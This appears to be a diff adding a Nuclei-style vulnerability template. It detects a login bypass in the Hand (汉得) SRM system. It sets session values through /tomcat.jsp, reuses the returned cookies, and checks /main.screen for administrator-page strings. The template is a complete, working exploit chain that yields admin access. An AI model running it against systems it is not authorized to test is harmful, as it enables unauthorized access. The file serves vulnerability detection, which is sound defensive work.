@@ -1,0 +1,74 @@
+id: poc-yaml-hande-SRM-login-bypass
+info:
+  name: 汉得-SRM-登陆绕过
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: authentication-bypass
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - id: extract-session
+    method: GET
+    path:
+      - "{{BaseURL}}/tomcat.jsp?dataName=role_id&dataValue=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "role_id"
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie"
+    extractors:
+      - type: regex
+        name: jsessionid
+        part: header
+        internal: true
+        regex:
+          - "JSESSIONID=([^;]+);"
+      - type: regex
+        name: route
+        part: header
+        internal: true
+        regex:
+          - "route=([^;]+);"
+
+  - id: validate-user
+    method: GET
+    path:
+      - "{{BaseURL}}/tomcat.jsp?dataName=user_id&dataValue=1"
+    headers:
+      Cookie: "JSESSIONID={{jsessionid}}; route={{route}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "user_id"
+
+  - id: verify-admin
+    method: GET
+    path:
+      - "{{BaseURL}}/main.screen"
+    headers:
+      Cookie: "JSESSIONID={{jsessionid}}; route={{route}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "云系统管理员"
+          - "云平台管理"
+          - "\"defaultvalue\":\"ADMIN\""
